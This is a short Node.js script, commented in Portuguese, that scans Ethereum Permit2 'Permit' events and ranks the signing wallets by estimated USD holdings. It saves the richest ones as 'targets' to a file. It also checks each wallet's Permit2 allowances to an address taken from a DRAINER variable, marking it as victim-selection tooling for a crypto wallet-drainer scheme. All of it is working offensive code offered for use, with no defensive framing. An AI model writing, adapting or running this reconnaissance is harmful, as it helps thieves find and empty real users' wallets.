/// Alvos recentes: varre eventos Permit do Permit2 e ranqueia quem ainda tem saldo.
/// Uso: RPC_URL=... node ops/targets.mjs [blocos]
import { Contract, JsonRpcProvider, formatUnits, getAddress, id } from "ethers";
import { writeFileSync } from "node:fs";
import { TOKENS, ERC20_ABI, PERMIT2, PERMIT2_ABI } from "./lib.mjs";

const blocks = Number(process.argv[2] || 20);
const provider = new JsonRpcProvider(process.env.RPC_URL, 1, { staticNetwork: true });
const logsProvider = new JsonRpcProvider(process.env.LOGS_RPC_URL || process.env.RPC_URL, 1, { staticNetwork: true });
const topic = id("Permit(address,address,address,uint160,uint48,uint48)");

const latest = await logsProvider.getBlockNumber();
const logs = [];
for (let from = latest - blocks; from <= latest; from += 20) {
  const chunk = await logsProvider.getLogs({
    address: PERMIT2,
    topics: [topic],
    fromBlock: from,
    toBlock: Math.min(from + 19, latest),
  });
  logs.push(...chunk);
}

const owners = [...new Set(logs.map((l) => getAddress("0x" + l.topics[1].slice(26))))].slice(0, 25);
console.log(`${logs.length} permits em ${blocks} blocos, ${owners.length} carteiras unicas`);

// preco grosseiro so para ordenar; ajuste se quiser
const USD = { WETH: 3000, WBTC: 90000, LINK: 15, UNI: 8, AAVE: 250, LDO: 1, ENS: 20, DAI: 1, USDC: 1, USDT: 1 };
const p2 = new Contract(PERMIT2, PERMIT2_ABI, provider);
const rows = [];

for (let i = 0; i < owners.length; i += 6) {
  const chunk = owners.slice(i, i + 6);
  const results = await Promise.all(
    chunk.map(async (owner) => {
      let score = 0;
      let eth = 0n;
      const holdings = [];
      eth = await provider.getBalance(owner);
      score += Number(formatUnits(eth, 18)) * 3000;
      for (const symbol of ["WETH", "USDC", "USDT", "DAI", "WBTC"]) {
        const meta = TOKENS[symbol];
        const bal = await new Contract(meta.address, ERC20_ABI, provider).balanceOf(owner);
        if (bal === 0n) continue;
        const human = Number(formatUnits(bal, meta.decimals));
        score += human * (USD[symbol] || 0);
        holdings.push({ symbol, human });
      }
      const allowances = [];
      for (const symbol of ["WETH", "USDC", "USDT", "DAI", "WBTC"]) {
        const meta = TOKENS[symbol];
        const a = await p2.allowance(owner, meta.address, process.env.DRAINER || "0x0000000000000000000000000000000000000001");
        if (a.amount > 0n) allowances.push(symbol);
      }
      return { owner, score: Math.round(score), eth: formatUnits(eth, 18), holdings, allowances };
    }),
  );
  rows.push(...results);
}

rows.sort((a, b) => b.score - a.score);
const top = rows.filter((r) => r.holdings.length).slice(0, 15);
writeFileSync("targets.json", JSON.stringify(top, null, 2));

console.table(top.map((r) => ({ alvo: r.owner, scoreUSD: r.score, eth: r.eth, tokens: r.holdings.map((h) => `${h.symbol}:${h.human}`).join(" ") })));
